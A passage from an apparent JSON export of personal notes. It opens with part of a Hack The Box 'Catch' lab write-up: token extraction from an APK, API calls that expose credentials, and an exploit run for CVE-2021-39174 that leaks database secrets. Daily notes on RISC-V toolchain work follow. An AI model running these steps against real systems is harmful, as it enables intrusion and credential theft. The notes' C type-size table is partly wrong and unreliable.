_csrf=QjeuksO6F_cYjyIciGl8BDMjLhE6MTY1ODY1MzYwNzA1MjcyNjIxMg; Path=/; Expires=Mon, 25 Jul 2022 09:06:47 GMT; HttpOnly; SameSite=Lax\n|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Sun, 24 Jul 2022 09:06:47 GMT\n|_    Content-Length: 0\n5000/tcp open  upnp?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: \n|     HTTP/1.1 400 Bad Request\n|     Connection: close\n|   GetRequest: \n|     HTTP/1.1 302 Found\n|     X-Frame-Options: SAMEORIGIN\n|     X-Download-Options: noopen\n|     X-Content-Type-Options: nosniff\n|     X-XSS-Protection: 1; mode=block\n|     Content-Security-Policy: \n|     X-Content-Security-Policy: \n|     X-WebKit-CSP: \n|     X-UA-Compatible: IE=Edge,chrome=1\n|     Location: /login\n|     Vary: Accept, Accept-Encoding\n|     Content-Type: text/plain; charset=utf-8\n|     Content-Length: 28\n|     Set-Cookie: connect.sid=s%3A2JdZA0jQc1Y4uvsSVVgGOX289Tfj8wMJ.8t1YnEkkHpQsuQ0UbYj%2Fg6KpKGeJujjWsI3JXo6vG7k; Path=/; HttpOnly\n|     Date: Sun, 24 Jul 2022 09:06:46 GMT\n|     Connection: close\n|     Found. Redirecting to /login\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     X-Frame-Options: SAMEORIGIN\n|     X-Download-Options: noopen\n|     X-Content-Type-Options: nosniff\n|     X-XSS-Protection: 1; mode=block\n|     Content-Security-Policy: \n|     X-Content-Security-Policy: \n|     X-WebKit-CSP: \n|     X-UA-Compatible: IE=Edge,chrome=1\n|     Allow: GET,HEAD\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 8\n|     ETag: W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\n|     Set-Cookie: connect.sid=s%3ANY_CBms2Ve1RlrbZje_fpCX0UI45OftF.9uB0CxsDxyQOG9lrOrPM%2BqA0qECc2CbOWXvPGSKjVAw; Path=/; HttpOnly\n|     Vary: Accept-Encoding\n|     Date: Sun, 24 Jul 2022 09:06:47 GMT\n|     Connection: close\n|_    GET,HEAD\n8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Catch Global Systems\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n```\n\nWe look at the cookies in `8000`:\n\n```\nGET / HTTP/1.1\nHost: 10.10.11.150:8000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nCookie: _csrf=gXmZ_9G_qsC8-pA87VTXGSPkWWY6MTY1ODY1Mzk3Mjk2OTQzNDI5Mg; XSRF-TOKEN=eyJpdiI6Im8wUnpxaHNzc21jZUNuYkoyUUlEaUE9PSIsInZhbHVlIjoiejVKekhXWXJJMFdSR2ZudVNwVllFMlVkVW5SeFwvSGM3MVRXNWI0UlNWdVJ6b3JKWkxGMlRIdWJybWdJT0k1WFgiLCJtYWMiOiI0NDgzYmJjMTc1NzU4MTg3MTA5YjU5ZDlhMjhhZWRiNTQyNDNlNzQ1OTU3MzczZjdmMTAxNTg1OWQyNTc4YjdjIn0%3D; laravel_session=eyJpdiI6IjFidXc0UTE0REhnMGZOSjVHSGZOTWc9PSIsInZhbHVlIjoiQmRBbDNPNlE2dFwvbkQzOFwvc2IxdURiVkF4ZnRcLzE2Z0V4VTBHMXNOUHZ6WXlGdUhpVzlLUTBrV0ZNQUh5VWtjRiIsIm1hYyI6ImU1NDdmMTJkYzc1MmFkN2FlOGQyNGEwYmJhODhiMDBlMDM2Yzg1YTNkMmU1MDQ4ZjFiNDhlZmFmM2JmMjc5OWYifQ%3D%3D\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\n```\n\nWe can download the file from the main website, which is an APK. We then open it with `jadx-gui`. We can look in `com/example.acatch/MainActivity`. It loads `https://status.catch.htb/`, so we look into it. First make sure to add it to the host file (`/etc/hosts`). Also a good idea to look through the de-compiled **apk** for anything password/token related. There is a reference to `gitea_token` and `lets chat` in `strings.xml`:\n\n```xml\n\u003cstring name=\"gitea_token\"\u003eb87bfb6345ae72ed5ecdcee05bcb34c83806fbd0\u003c/string\u003e\n\n\u003cstring name=\"lets_chat_token\"\u003eNjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\u003c/string\u003e\n```\n\nThe `lets chat` token is **base64** so we:\n\n```bash\n~/htb/catch \u003e echo -n NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ== | base64 -d\n61b86aead984e2451036eb16:d588468ff8bae446379a57fa2b4e63a2368224336b5949c5%\n```\n\nWe can do:\n\n```bash\n[~/htb/catch \u003e curl -H \"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" 10.10.11.150:5000/rooms\n[{\"id\":\"61b86b28d984e2451036eb17\",\"slug\":\"status\",\"name\":\"Status\",\"description\":\"Cachet Updates and Maintenance\",\"lastActive\":\"2021-12-14T10:34:20.749Z\",\"created\":\"2021-12-14T10:00:08.384Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]},{\"id\":\"61b8708efe190b466d476bfb\",\"slug\":\"android_dev\",\"name\":\"Android Development\",\"description\":\"Android App Updates, Issues \u0026 More\",\"lastActive\":\"2021-12-14T10:24:21.145Z\",\"created\":\"2021-12-14T10:23:10.474Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]},{\"id\":\"61b86b3fd984e2451036eb18\",\"slug\":\"employees\",\"name\":\"Employees\",\"description\":\"New Joinees, Org updates\",\"lastActive\":\"2021-12-14T10:18:04.710Z\",\"created\":\"2021-12-14T10:00:31.043Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]}]](\u003c~/htb/catch %3E curl -H \"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" 10.10.11.150:5000/rooms | jq .                                                          8s\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   860  100   860    0     0   4820      0 --:--:-- --:--:-- --:--:--  4804\n[\n  {\n    \"id\": \"61b86b28d984e2451036eb17\",\n    \"slug\": \"status\",\n    \"name\": \"Status\",\n    \"description\": \"Cachet Updates and Maintenance\",\n    \"lastActive\": \"2021-12-14T10:34:20.749Z\",\n    \"created\": \"2021-12-14T10:00:08.384Z\",\n    \"owner\": \"61b86aead984e2451036eb16\",\n    \"private\": false,\n    \"hasPassword\": false,\n    \"participants\": []\n  },\n  {\n    \"id\": \"61b8708efe190b466d476bfb\",\n    \"slug\": \"android_dev\",\n    \"name\": \"Android Development\",\n    \"description\": \"Android App Updates, Issues \u0026 More\",\n    \"lastActive\": \"2021-12-14T10:24:21.145Z\",\n    \"created\": \"2021-12-14T10:23:10.474Z\",\n    \"owner\": \"61b86aead984e2451036eb16\",\n    \"private\": false,\n    \"hasPassword\": false,\n    \"participants\": []\n  },\n  {\n    \"id\": \"61b86b3fd984e2451036eb18\",\n    \"slug\": \"employees\",\n    \"name\": \"Employees\",\n    \"description\": \"New Joinees, Org updates\",\n    \"lastActive\": \"2021-12-14T10:18:04.710Z\",\n    \"created\": \"2021-12-14T10:00:31.043Z\",\n    \"owner\": \"61b86aead984e2451036eb16\",\n    \"private\": false,\n    \"hasPassword\": false,\n    \"participants\": []\n  }\n]\u003e)\n```\n\nWe can look into the employers ID and look at messages:\n\n```bash\n~/htb/catch \u003e curl -H \"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" 10.10.11.150:5000/rooms/61b86b3fd984e2451036eb18/messages | jq .\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1065  100  1065    0     0   3025      0 --:--:-- --:--:-- --:--:--  3034\n[\n  {\n    \"id\": \"61b86f5cfe190b466d476bf7\",\n    \"text\": \"Thanks @admin \",\n    \"posted\": \"2021-12-14T10:18:04.710Z\",\n    \"owner\": \"61b86f15fe190b466d476bf5\",\n    \"room\": \"61b86b3fd984e2451036eb18\"\n  },\n  {\n    \"id\": \"61b86ef2fe190b466d476bf4\",\n    \"text\": \"Please welcome our new IT Admin - Lucas, a crucial role that will help Catch’s revenue and will contribute to the overall profitability of the company!\",\n    \"posted\": \"2021-12-14T10:16:18.187Z\",\n    \"owner\": \"61b86aead984e2451036eb16\",\n    \"room\": \"61b86b3fd984e2451036eb18\"\n  },\n  {\n    \"id\": \"61b86e5dfe190b466d476bf3\",\n    \"text\": \"Thanks John! Glad to be part of the Catch \",\n    \"posted\": \"2021-12-14T10:13:49.568Z\",\n    \"owner\": \"61b86e40fe190b466d476bf2\",\n    \"room\": \"61b86b3fd984e2451036eb18\"\n  },\n  {\n    \"id\": \"61b86e12fe190b466d476bf1\",\n    \"text\": \"Welcome Will!\",\n    \"posted\": \"2021-12-14T10:12:34.388Z\",\n    \"owner\": \"61b86dbdfe190b466d476bf0\",\n    \"room\": \"61b86b3fd984e2451036eb18\"\n  },\n  {\n    \"id\": \"61b86d5ffe190b466d476bef\",\n    \"text\": \"Join me in welcoming our new employee Will Robinson who's working as iOS Developer with John Team\",\n    \"posted\": \"2021-12-14T10:09:35.597Z\",\n    \"owner\": \"61b86aead984e2451036eb16\",\n    \"room\": \"61b86b3fd984e2451036eb18\"\n  }\n]\n```\n\nSo **Lucas** is admin. Found some credentials in `status/messages`:\n\n```bash\n{\n    \"id\": \"61b8702dfe190b466d476bfa\",\n    \"text\": \"Here are the credentials `john :  E}V!mywu_69T4C}W`\",\n    \"posted\": \"2021-12-14T10:21:33.859Z\",\n    \"owner\": \"61b86f15fe190b466d476bf5\",\n    \"room\": \"61b86b28d984e2451036eb17\"\n  },\n```\n\nIt works on Catchet!! `10.10.11.150:8000/auth/login`. We have version **2.4.0**. We can try **CVE-2021-39174**. Running it we get:\n\n```bash\n~/htb/catch \u003e python3 exploit.py -n john -p 'E}V!mywu_69T4C}W' -u http://10.10.11.150:8000                                                                                                                                                11s\n[+] Getting CSRF token\n[+] CSRF token: 5yYafvynDhngG6M0URL46zNHv5JpDRoz8gEXgbvC\n[+] Logging in as user 'john'\n[+] Successfully logged in\n[+] Getting current field values\n[+] Sending payload\n[+] Connection error. Retrying in 5s.\n[+] Extracted the following values:\n- APP_KEY\t\t= base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=\n- DB_DRIVER\t\t= mysql\n- DB_HOST\t\t= localhost\n- DB_DATABASE\t\t= cachet\n- DB_USERNAME\t\t= will\n- DB_PASSWORD\t\t= s2#4Fg0_%3!\n[+] Unsetting payload variable\n[+] Exiting\n```\n\n${DB_USERNAME}",
    "lastmodified": "2022-11-24T12:20:52.790597677Z",
    "tags": null
  },
  "/notes/daily/2022-07-25": {
    "title": "2022-07-25",
    "content": "# 2022-07-25\n---\n`flw` for example is only supported by 32-bits. Therefore, there is a `fail march` test which uses `rv32i`. `rv64` doesn't support `zcf`, so should I still do the same thing? Do we put **all** XFAILs together or just the not supported insn? So for example, 64 is not supported by 32 so XFAIL (but different then unsupported insn)",
    "lastmodified": "2022-11-24T12:20:52.817573667Z",
    "tags": null
  },
  "/notes/daily/2022-07-26": {
    "title": "2022-07-26",
    "content": "# 2022-07-26\n---\n`c.flwsp` -\u003e zero-extended 6-bit immediate, **scaled by 4** (4^6=4096) and the boundary is half of that minus 1, thus 2047.\n\nIt seems like the boundary for not **sp** instructions, for example:\n\n```bash\n0:\t7d68                \tc.flw\tfa0,124(a0)\n```\n\nIs **124**. And for **sp**:\n\n```bash\n2:\t756e                \tc.flwsp\tfa0,248(sp)\n```\n\n**248**\n\n```bash\n124 = 0111 1100\n248 = 1111 1000\n```",
    "lastmodified": "2022-11-24T12:20:53.012537241Z",
    "tags": null
  },
  "/notes/daily/2022-07-28": {
    "title": "2022-07-28",
    "content": "# 2022-07-28\n---\n- Write up Project Plan\n- Don't forget linker tests for jumps!\n- Holiday on Monday",
    "lastmodified": "2022-11-24T12:20:53.431167722Z",
    "tags": null
  },
  "/notes/daily/2022-08-03": {
    "title": "2022-08-03",
    "content": "# 2022-08-03\n---\n## Everest\nOriginally with WD but now with the new company (secret).\n\n- Code size improvements, get close to GCC - LLVM\n- Overlay - can have code as overlay, goes in slow memory and you can dynamically load it to RAM. Similar to virtual memory, cache but it is a software only solution. They use ComRV (Common overlay for RISC-V).\n\nComRV:\n- Rebase LLVM - upstream - 15 \n- Rebase binutils - upstream - latest - not tested\n- Rebase GDB - standard GDB would crash when we get to an overlay for example - half upstream - latest - not done\n\nCode size:\n- Apply fail save/restore patches.\n- Apply LTO patch.\n\nWe can't do upstream stuff.\n\nThey want to roll forward all the work done. \n\nNeeds to fix GCC for LLVM tests as it won't run.\n\n",
    "lastmodified": "2022-11-24T12:20:53.244123697Z",
    "tags": null
  },
  "/notes/daily/2022-08-04": {
    "title": "2022-08-04",
    "content": "# 2022-08-04\n---\n- [x] Message Arjan to let him know the assembler is complete and where to find it. Also that we are now working on the linker and documentation. Schedule a meeting to check on progress and make sure he is happy with what has been done. ⏫ 📅 2022-08-04 ✅ 2022-08-04\n\n- [x] Make sure to send the \"@here can I have an update on total time spent this month and any words for this week's report?\" message on Friday. ⏫ 📅 2022-08-05 ✅ 2022-08-05\n\n- [x] Finish building GCC for Cobra (locally) 🔼 ✅ 2022-08-05",
    "lastmodified": "2022-11-24T12:20:53.47889483Z",
    "tags": null
  },
  "/notes/daily/2022-08-09": {
    "title": "2022-08-09",
    "content": "# 2022-08-09\n---\n## Data Storage Sizes\n| C/C++     | Storage         | Size (bits) | Size (bytes) |\n| --------- | --------------- | ----------- | ------------ |\n| char      | Byte            | 8-bits      | 1 byte       |\n| short     | Word            | 16-bits     | 2 bytes      |\n| int       | Double-word     | 32-bits     | 4 bytes      |\n| long      | Quadword        | 64-bits     | 8 bytes      |\n| long long | Quadword        | 64-bits     | 8 bytes      |\n| int *     | Quadword        | 64-bits     | 8 bytes      |\n| double    | Quadword        | 64-bits     | 8 bytes      |\n| float     | Double quadword | 128-bits    | 16 bytes     |\n\n- `.cfi_def_cfa_offset`: CFI directives are used for debugging. It allows the debugger to unwind a stack, for example: if a procedure A calls procedure B which then calls a common procedure C. Procedure C fails. You now want to know who actually called C and then you may want to know who called B.\n\nA debugger can **unwind** this stack by using the stack pointer (`%rsp`) and register `%rbp`, however it needs to know how to find them. This is where CFI comes in:\n\n```as\nmovq    %rsp, %rbp\n.cfi_def_cfa_register 6\n```\n\nThe last line tell it that the **Call Frame Address** is now in register 6 (`%rbp`).\n\nTo disable these, g++ needs `-fno-exceptions` along with `-fno-asynchronous-unwind-tables`, provided that you don't use exceptions. `-fno-dwarf2-cfi-asm` may also be needed.\n\nOn Godbolt: `-g0 -fno-asynchronous-unwind-tables`\n\nSomething like this:\n\n```bash\ng++ -fno-asynchronous-unwind-tables -fno-exceptions -fno-rtti -fverbose-asm -Wall -Wextra foo.cpp -O3 -masm=intel -S -o- | less\n```\n\n## Useful compiler options for making asm for human consumption:\n-   **Remember, your code only has to compile, not link: passing a pointer to an external function like `void ext(void*p)` is a good way to stop something from optimising away**. You only need a prototype for it, with no definition so the compiler can't inline it or make any assumptions about what it does. (Or [inline asm like `Benchmark::DoNotOptimize`](https://stackoverflow.com/questions/40122141/preventing-compiler-optimizations-while-benchmarking) can force a compiler to materialise a value in a register, or forget about it being a known constant, if you know GNU C inline asm syntax well enough to use constraints to understand the effect you're having on what you're requiring of the compiler.)\n    \n-   I'd recommend using `-O3 -Wall -Wextra -fverbose-asm -march=haswell` for looking at code. (`-fverbose-asm` can just make the source look noisy, though, when all you get are numbered temporaries as names for the operands.) When you're fiddling with the source to see how it changes the asm, you _definitely_ want compiler warnings enabled. You don't want to waste time scratching your head over the asm when the explanation is that you did something that deserves a warning in the source.\n    \n-   To see how the calling convention works, **you often want to look at caller and callee without inlining**.\n    \n    You can use `__attribute__((noipa)) foo_t foo(bar_t x) { ... }` on a definition, or compile with `gcc -O3 -fno-inline-functions -fno-inline-functions-called-once -fno-inline-small-functions` to disable inlining. (But those command line options don't disable cloning a function for constant-propagation. `noipa` = no Inter-Procedural Analysis. It's even stronger than `__attribute__((noinline,noclone))`.) See [not decay is not allowed?](https://stackoverflow.com/questions/50775127/from-compiler-perspective-how-is-reference-for-array-dealt-with-and-why-passi) for an example.\n    \n    Or if you just want to see how functions pass / receive args of different types, you could use different names but the same prototype so the compiler doesn't have a definition to inline. This works with any compiler. Without a definition, a function is just a black box to the optimiser, governed only by the calling convention / ABI.\n    \n-   `-ffast-math` will get many libm functions to inline, some to a single instruction (esp. with SSE4 available for `roundsd`). Some will inline with just `-fno-math-errno`, or other \"safer\" parts of `-ffast-math`, without the parts that allow the compiler to round differently. If you have FP code, definitely look at it with/without `-ffast-math`. If you can't safely enable any of `-ffast-math` in your regular build, maybe you'll get an idea for a safe change you can make in the source to allow the same optimisation without `-ffast-math`.\n    \n-   **`-O3 -fno-tree-vectorize` will optimise without auto-vectorising**, so you can get full optimisation without if you want to compare with `-O2` (which doesn't enable autovectorisation on gcc11 and earlier, but does on all clang).\n    \n    **`-Os` (optimise for size and speed) can be helpful** to keep the code more compact, which means less code to understand. clang's `-Oz` optimises for size even when it hurts speed, even using `push 1` / `pop rax` instead of `mov eax, 1`, so that's only interesting for [code golf](https://codegolf.stackexchange.com/questions/132981/tips-for-golfing-in-x86-x64-machine-code).\n    \n    Even `-Og` (minimal optimisation) might be what you want to look at, depending on your goals. `-O0` is full of store/reload noise, which makes it harder to follow, [unless you use `register` vars](https://stackoverflow.com/questions/53366394/why-does-clang-produce-inefficient-asm-with-o0-for-this-simple-floating-point). The only upside is that each C statement compiles to a separate block of instructions, and it makes `-fverbose-asm` able to use the actual C var names.\n    \n-   clang unrolls loops by default, so **`-fno-unroll-loops` can be useful in complex functions**. You can get a sense of \"what the compiler did\" without having to wade through the unrolled loops. (gcc enables `-funroll-loops` with `-fprofile-use`, but not with `-O3`). (This is a suggestion for human-readable code, not for code that would run faster.)\n    \n-   **Definitely enable some level of optimisation, unless you specifically want to know what `-O0` did**. Its \"predictable debug behaviour\" requirement makes the compiler store/reload everything between every C statement, so you can modify C variables with a debugger and even \"jump\" to a different source line within the same function, and have execution continue as if you did that in the C source. `-O0` output is so noisy with stores/reloads (and so slow) not just from lack of optimisation, but [forced de-optimisation to support debugging](https://stackoverflow.com/questions/53366394/why-does-clang-produce-inefficient-asm-with-o0-for-this-simple-floating-point). (also https://stackoverflow.com/questions/46638527/when-will-the-trivial-code-that-has-no-effect-code-gets-removed-in-compilation/46640101#46640101).  \n---\n**To get a mix of source and asm**, use [`gcc -Wa,-adhln -c -g foo.c | less`](https://stackoverflow.com/a/137479/224132) to pass extra options to `as`. (More discussion of this in [a blog post](http://www.systutorials.com/240/generate-a-mixed-source-and-assembly-listing-using-gcc/), and [another blog](https://panthema.net/2013/0124-GCC-Output-Assembler-Code/).). Note that the output of this isn't valid assembler input, because the C source is there directly, not as an assembler comment. So don't call it a `.s`. A `.lst` might make sense if you want to save it to a file.\n\nGodbolt's color highlighting serves a similar purpose, and is great at helping you see when multiple _non-contiguous_ asm instructions come from the same source line. I haven't used that gcc listing command at all, so IDK how well it does, and how easy it is for the eye to see, in that case.\n\nI like the high code density of godbolt's asm pane, so I don't think I'd like having source lines mixed in. At least not for simple functions. Maybe with a function that was too complex to get a handle on the overall structure of what the asm does...\n\n---\nAnd remember, when you want to just look at the asm, **leave out the `main()` and the compile-time constants**. You want to see the code for dealing with a function arg in a register, not for the code after constant-propagation turns it into `return 42`, or at least optimises away some stuff.\n\nRemoving `static` and/or `inline` from functions will produce a stand-alone definition for them, as well as a definition for any callers, so you can just look at that.\n\n**Don't put your code in a function called `main()`**. gcc knows that `main` is special and assumes it will only be called once, so it marks it as \"cold\" and optimises it less.\n\n---\nThe other thing you can do: If you did make a `main()`, you can run it and use a debugger. `stepi` (`si`) steps by instruction. See the bottom of the [x86](https://stackoverflow.com/questions/tagged/x86 \"show questions tagged 'x86'\") [tag wiki](https://stackoverflow.com/tags/x86/info) for instructions. But remember that code might optimise away after inlining into main with compile-time-constant args.\n\n`__attribute__((noinline))` may help, on a function that you want to not be inlined. gcc will also make constant-propagation clones of functions, i.e. a special version with one of the args as a constant, for call-sites that know they're passing a constant. The symbol name will be `.clone.foo.constprop_1234` or something in the asm output. You can use `__attribute__((noclone))` to disable that, too.).\n\n---\n### For example\n```csharp\n// the wrong way, which people often write when they're used to creating a runnable test-case with a main() and a printf\n// or worse, people will actually look at the asm for such a main()\nint constants() { int a = 10, b = 20; return a * b; }\n    mov     eax, 200  #,\n    ret                     # compiles the same as  return 200;  not interesting\n\n// the right way: compiler doesn't know anything about the inputs\n// so we get asm like what would happen when this inlines into a bigger function.\nint variables(int a, int b) { return a * b; }\n    mov     eax, edi  # D.2345, a\n    imul    eax, esi        # D.2345, b\n    ret\n```\n\n## Objdump Tips\nYou can even tell `objdump` to intermix source with assembly, making it easier to figure out what source line corresponds to what instructions. Example session:\n\n```csharp\n$ cat test.cc\nint foo(int arg)\n{\n    return arg * 42;\n}\n\n$ g++ -g -O3 -std=c++14 -c test.cc -o test.o \u0026\u0026 objdump -dS -M intel test.o\n\ntest.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 \u003c_Z3fooi\u003e:\nint foo(int arg)\n{\n    return arg + 1;\n   0:   8d 47 01                lea    eax,[rdi+0x1]\n}\n   3:   c3                      ret    \n```\n\nExplanation of `objdump` flags:\n\n-   `-d` disassembles all executable sections\n-   `-S` intermixes assembly with source (`-g` required while compiling with `g++`)\n-   `-M intel` chooses intel syntax over ugly AT\u0026T syntax (_optional_)\n\n---\n## Two's Complement\n- `1111` -\u003e -1, `1001` -\u003e -2",
    "lastmodified": "2022-11-24T12:20:53.54718554Z",
    "tags": null
  },
  "/notes/daily/2022-08-16": {
    "title": "2022-08-16",
    "content": "# 2022-08-16\n---\n- GCC - https://github.com/pietraferreira/corev-gcc/tree/cobra-stable\n- Binutils-GDB - https://github.com/pietraferreira/corev-binutils-gdb/tree/cobra-stable\n- Newlib - https://sourceware.org/git/newlib-cygwin.git\n\nfiles built with this compiler will misinform the version that is implemented",
    "lastmodified": "2022-11-24T12:20:53.630956411Z",
    "tags": null
  },
  "/notes/daily/2022-08-17": {
    "title": "2022-08-17",
    "content": "# 2022-08-17\n---\n## Cobra Tasks\n- Fix Issues:\n    - Jump table located incorrectly\n    - Relaxation (Charlie has submitted a PR)\n    - (GCC) Incorrect version\n\nThen we can test the linker.\n\nTest Charlie's patch.\n\nZc.lbu and so on, for half-words only the odd ones are being accepted.\n\nWe would need to fix them to be able to incorporate our changes upstream.\n\nWe need to make sure from now on we use a **stable** newlib and not upstream.\n\nI'm not sure about this one but we might have to work on some documentation. The reason I'm unsure is because the Zc\\* docs should be probably be revised before anything is added. Might be our job to do that but as of right now I don't think it is a priority.\n\n## Everest\n- ComRV support.\n\n- Update toolchain build scripts, including:\n    - Checkout different branches\n    - Build separate binutils and gdb\n- Build toolchain and make sure it runs (cti - common testing infrastructure)\n- Put in Jenkins\n\nInternal Embecosm WD/ComRV Demo page to use CTI.\n\nThe build script is missing the right branches and not checking out binutils and gdb separately.",
    "lastmodified": "2022-11-24T12:20:53.65631187Z",
    "tags": null
  },
  "/notes/daily/2022-08-18": {
    "title": "2022 08 18",
    "content": "# 2022 08 18\n---\nHello Robin,\n\nThanks for reporting this issue.\n\nWe've taken a look at it and it seems to be an issue with the latest development Newlib that doesn't show up in GCC testing. We've gone back and checked that this issue doesn't exist in a recent newlib release, and indeed if we use that library instead we are able to build the core-v-verif hello world file.\n\nAs such we've built an updated set of binaries that work in this case: https://files.embecosm.com/s/yS3zDdAofpX87aM (corev-openhw-zc-gcc-centos7-20220818.tar.xz). Only newlib here has changed, everything else is the same as it was for the tools we provided earlier in the week.\n\nHopefully this works on your end, but if you find any more issues, please let us know and we'll look into them.\n\nKind Regards,\nPietra\n\n---\n\nWe have investigated the issue and we found that, since early this year, Newlib modified the way they substitute `@NEWLIB_MAJOR_VERSION@`. \n\n```\nThe following sources were used in this build:\n\nbuild-scripts: ac59ec3716347e3b09cadc3494b3252f6d5d7a8e (git@github.com:embecosm/embecosm-toolchain-releases.git)\nnewlib: 415fdd4279b85eeec9d54775ce13c5c412451e08 (https://sourceware.org/git/newlib-cygwin.git)\ngcc: 19c344a2f780bcd009a6a9eeb781d19ea21efd52 (git@github.com:pietraferreira/corev-gcc.git)\nbinutils-gdb: fdd02d93bd756830ff0854cb0704c89c8b7a4f93 (git@github.com:pietraferreira/corev-binutils-gdb.git)\nbinutils-gdb-sim: 18ea42a432d16db09fbed5bc9e60b4e3b7c2caa7 (git@github.com:embecosm/riscv-binutils-gdb.git)\n```\n\n---\n\nThanks, Pietra. That solved the problem.\n\nUnfortunately, I am seeing yet another problem.\nThis is the error message \"/work/ropeders/src/core-v-verif-40s/cv32e40s/bsp/syscalls.c:45:5: error: token \"@\" is not valid in preprocessor expressions\".\nThat file uses \"__NEWLIB__\" included via \"sys/stat.h\" -\u003e \"_ansi.h\" -\u003e \"newlib.h\" -\u003e \"_newlib_version.h\" -\u003e \"#define __NEWLIB__ @NEWLIB_MAJOR_VERSION@\".\n\nIn case it helps you in any way to compile the core-v-verif hello world elf yourself, I am including a minimal setup for how to do it at the end of this email.\n\nRegards Robin.\n\n\nClone [\"https://github.com/openhwgroup/core-v-verif\"](https://github.com/openhwgroup/core-v-verif).\nOptionally, change branch to \"cv32e40s/dev\" (shouldn't matter).\nGo to \"core-v-verif/cv32e40s/sim/uvmt/\".\nSet the variable \"export CV_SW_TOOLCHAIN=\u003cyour install\u003e/corev-openhw-zc-gcc-centos7-20220816\".\nAnd the variable \"export CV_SW_PREFIX=riscv32-corev-elf-\".\nAnd the variable \"export CV_SIMULATOR=xrun\".\nRun \"make hex TEST=hello-world\".\n(Hopefully that is all, unless I unknowingly have something implicit in my setup.)",
    "lastmodified": "2022-11-24T12:20:53.742768288Z",
    "tags": null
  },
  "/notes/daily/2022-08-22-cobra-report": {
    "title": "Assembler Support for the RISC-V Zc* Extension - Report",
    "content": "# Assembler Support for the RISC-V Zc\\* Extension - Report\n\nWe've provided an interim release of the pre-built binaries and any support necessary to use them. We are now working on testing the jump table so we can incorporate the changes in the official CORE-V Binutils/GCC repositories.\n\nWe aim to make our final release by Friday the 26th.\n\n## Completed Last Week\n- Provided an interim release of pre-built binaries and support necessary to use them.\n- Moved the Zcmt jump table from the `.text` section to the `.rodata` section.\n- Fixed version numbers associated with Zc\\* in both GAS and GCC.\n- Fixed invalid operands being accepted for `cm.lbu`, `cm.lhu`, `cm.lh`, `cm.sb`, and `cm.sh`.\n- Fixed binary incompatibility issue involving `lbu` and related instructions being relaxed to custom extension encodings.\n- Update CSR tests to account for JVT.\n\n## GNU Assembler Test Results\n|                        | Previous | Current | Delta |\n| ---------------------- | -------- | ------- | ----- |\n| # of expected passes   | 769      | 769     | 0     |\n| # of expected failures | 22       | 22      | 0     |\n| # of unsupported tests | 5        | 5       | 0     | \n\n- All the work can be found here (**cobra-stable**): https://github.com/pietraferreira/corev-binutils-gdb/tree/cobra-stable\n\n## GCC Test Results\n|                          | Previous | Current | Delta |\n| ------------------------ | -------- | ------- | ----- |\n| # of expected passes     | 564      | 582     | +18   | \n| # of unexpected failures | 22       | 0       | -22   |\n| # of unsupported tests   | 9        | 0       | -9    |\n\nNote that the total number of tests has remained unchanged, however more expected passes are present now as we fixed those tests resulting in unexpected failure.\n\n- All the work can be found here (**cobra-stable**): https://github.com/pietraferreira/corev-gcc/tree/cobra-stable\n\n## Plans for Current Work\n- Complete testing of linker.\n- Incorporate all changes in the official CORE-V Binutils/GCC repositories.\n- Make final release.",
    "lastmodified": "2022-11-24T12:20:53.757757306Z",
    "tags": null
  },
  "/notes/daily/2022-08-24": {
    "title": "2022-08-24",
